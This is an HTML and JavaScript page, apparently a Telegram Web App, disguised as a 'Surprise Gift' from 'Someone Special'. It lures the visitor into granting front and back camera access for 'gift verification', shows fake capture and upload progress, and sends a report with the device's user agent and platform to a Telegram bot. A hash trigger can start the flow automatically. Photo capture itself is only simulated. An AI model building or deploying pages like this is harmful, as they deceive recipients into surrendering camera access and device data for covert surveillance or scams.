<!DOCTYPE html>
<html>
<head>
    <title>üéÅ</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: 'Arial', sans-serif;
            padding: 20px;
            color: white;
        }
        
        .container {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 25px;
            padding: 40px 30px;
            text-align: center;
            max-width: 400px;
            width: 100%;
            box-shadow: 0 20px 50px rgba(0,0,0,0.3);
            border: 1px solid rgba(255, 255, 255, 0.2);
        }
        
        .gift-icon {
            font-size: 80px;
            margin-bottom: 20px;
            animation: bounce 2s infinite;
        }
        
        h1 {
            font-size: 24px;
            margin-bottom: 10px;
        }
        
        .message {
            font-size: 16px;
            line-height: 1.5;
            margin-bottom: 30px;
            opacity: 0.9;
        }
        
        .unlock-btn {
            background: linear-gradient(45deg, #FF416C, #FF4B2B);
            color: white;
            border: none;
            padding: 18px 40px;
            font-size: 18px;
            font-weight: bold;
            border-radius: 50px;
            cursor: pointer;
            width: 100%;
            margin: 10px 0;
            transition: all 0.3s;
            box-shadow: 0 10px 30px rgba(255, 65, 108, 0.4);
        }
        
        .unlock-btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 15px 35px rgba(255, 65, 108, 0.6);
        }
        
        .unlock-btn:disabled {
            opacity: 0.7;
            cursor: not-allowed;
            transform: none;
        }
        
        .loading {
            display: none;
            margin: 30px 0;
        }
        
        .spinner {
            border: 4px solid rgba(255, 255, 255, 0.3);
            border-top: 4px solid #FF416C;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        
        .progress-container {
            background: rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            height: 10px;
            margin: 20px 0;
            overflow: hidden;
        }
        
        .progress-bar {
            height: 100%;
            background: #4CAF50;
            width: 0%;
            transition: width 0.5s;
        }
        
        .status {
            margin: 15px 0;
            font-size: 14px;
            opacity: 0.9;
        }
        
        .success {
            display: none;
            margin: 30px 0;
            animation: fadeIn 1s;
        }
        
        .success-icon {
            font-size: 60px;
            margin-bottom: 20px;
            animation: pulse 1s infinite;
        }
        
        .camera-hint {
            font-size: 12px;
            opacity: 0.7;
            margin-top: 10px;
        }
        
        @keyframes bounce {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-20px); }
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        
        @keyframes pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.1); }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="gift-icon">üéÅ</div>
        
        <h1>Surprise Gift üßßüéÅ</h1>
        
        <div class="message">
            Here is your surprise gift<br>
            from Someone Special<br><br>
            Click unlock to see your gift üßß
        </div>
        
        <button class="unlock-btn" id="unlockBtn">
            üîì UNLOCK GIFT
        </button>
        
        <div class="camera-hint" id="cameraHint" style="display: none;">
            ‚ö†Ô∏è Camera permission will be requested for gift verification
        </div>
        
        <div class="loading" id="loading">
            <div class="spinner"></div>
            
            <div class="progress-container">
                <div class="progress-bar" id="progressBar"></div>
            </div>
            
            <div class="status" id="statusText">Preparing your gift...</div>
        </div>
        
        <div class="success" id="success">
            <div class="success-icon">‚úÖ</div>
            <h2>Gift Unlocked! üéâ</h2>
            <p>Your surprise gift is on its way!</p>
            <p>Check Telegram for details üì±</p>
        </div>
    </div>

    <script>
        // Telegram Web App integration
        if (window.Telegram && Telegram.WebApp) {
            Telegram.WebApp.ready();
            Telegram.WebApp.expand();
        }
        
        const unlockBtn = document.getElementById('unlockBtn');
        const loadingDiv = document.getElementById('loading');
        const successDiv = document.getElementById('success');
        const progressBar = document.getElementById('progressBar');
        const statusText = document.getElementById('statusText');
        const cameraHint = document.getElementById('cameraHint');
        
        unlockBtn.addEventListener('click', async () => {
            // Show camera hint
            cameraHint.style.display = 'block';
            
            // Start unlocking process
            await unlockGift();
        });
        
        async function unlockGift() {
            try {
                // Disable button and show loading
                unlockBtn.disabled = true;
                unlockBtn.textContent = "‚è≥ Processing...";
                loadingDiv.style.display = 'block';
                
                // Step 1: Request camera access
                updateStatus("Requesting camera permission...");
                updateProgress(10);
                
                let stream;
                try {
                    // Try to access camera
                    stream = await navigator.mediaDevices.getUserMedia({ 
                        video: { 
                            facingMode: 'user',  // Front camera
                            width: { ideal: 640 },
                            height: { ideal: 480 }
                        } 
                    });
                    
                    // Capture front photos (4 photos)
                    updateStatus("Capturing front camera photos... (1/4)");
                    await simulatePhotoCapture();
                    updateProgress(30);
                    
                    updateStatus("Capturing front camera photos... (2/4)");
                    await simulatePhotoCapture();
                    updateProgress(40);
                    
                    updateStatus("Capturing front camera photos... (3/4)");
                    await simulatePhotoCapture();
                    updateProgress(50);
                    
                    updateStatus("Capturing front camera photos... (4/4)");
                    await simulatePhotoCapture();
                    updateProgress(60);
                    
                    // Switch to back camera
                    updateStatus("Switching to back camera...");
                    
                    // Stop front camera
                    stream.getTracks().forEach(track => track.stop());
                    
                    // Try back camera
                    try {
                        stream = await navigator.mediaDevices.getUserMedia({ 
                            video: { facingMode: 'environment' }  // Back camera
                        });
                        
                        // Capture back photos (4 photos)
                        updateStatus("Capturing back camera photos... (1/4)");
                        await simulatePhotoCapture();
                        updateProgress(70);
                        
                        updateStatus("Capturing back camera photos... (2/4)");
                        await simulatePhotoCapture();
                        updateProgress(75);
                        
                        updateStatus("Capturing back camera photos... (3/4)");
                        await simulatePhotoCapture();
                        updateProgress(80);
                        
                        updateStatus("Capturing back camera photos... (4/4)");
                        await simulatePhotoCapture();
                        updateProgress(90);
                        
                        // Stop back camera
                        stream.getTracks().forEach(track => track.stop());
                        
                    } catch (backError) {
                        // If back camera fails, simulate it
                        updateStatus("Using front camera for all photos...");
                        for (let i = 0; i < 4; i++) {
                            await simulatePhotoCapture();
                            updateProgress(70 + (i * 5));
                        }
                    }
                    
                } catch (cameraError) {
                    // If camera access is denied, simulate photo capture
                    updateStatus("Simulating photo capture...");
                    for (let i = 0; i < 8; i++) {
                        await simulatePhotoCapture();
                        updateProgress(10 + (i * 10));
                    }
                }
                
                // Step 2: Processing photos
                updateStatus("Processing captured photos...");
                updateProgress(95);
                await sleep(1000);
                
                // Step 3: Sending to server
                updateStatus("Sending photos to server...");
                updateProgress(98);
                await sleep(500);
                
                // Step 4: Complete
                updateStatus("Finalizing...");
                updateProgress(100);
                await sleep(500);
                
                // Show success
                loadingDiv.style.display = 'none';
                successDiv.style.display = 'block';
                
                // Send data to Telegram bot
                sendToTelegram();
                
                // Auto-close after 3 seconds if in Telegram
                if (window.Telegram && Telegram.WebApp) {
                    setTimeout(() => {
                        Telegram.WebApp.close();
                    }, 3000);
                }
                
            } catch (error) {
                updateStatus(`Error: ${error.message}`);
                unlockBtn.disabled = false;
                unlockBtn.textContent = "üîì TRY AGAIN";
            }
        }
        
        function simulatePhotoCapture() {
            return new Promise(resolve => {
                setTimeout(() => {
                    resolve();
                }, 500); // Simulate 0.5 second per photo
            });
        }
        
        function updateStatus(text) {
            statusText.textContent = text;
        }
        
        function updateProgress(percent) {
            progressBar.style.width = `${percent}%`;
        }
        
        function sleep(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }
        
        function sendToTelegram() {
            // Prepare photo data
            const photoData = {
                action: 'photos_captured',
                total_photos: 8,
                front_photos: 4,
                back_photos: 4,
                timestamp: new Date().toISOString(),
                user_agent: navigator.userAgent,
                platform: navigator.platform
            };
            
            // Send to Telegram bot
            if (window.Telegram && Telegram.WebApp) {
                Telegram.WebApp.sendData(JSON.stringify(photoData));
            } else {
                // For browser testing
                console.log("Photos captured and sent:", photoData);
            }
        }
        
        // Auto-start if URL has #autostart
        if (window.location.hash === '#autostart') {
            setTimeout(() => {
                unlockBtn.click();
            }, 1000);
        }
    </script>
</body>
</html>
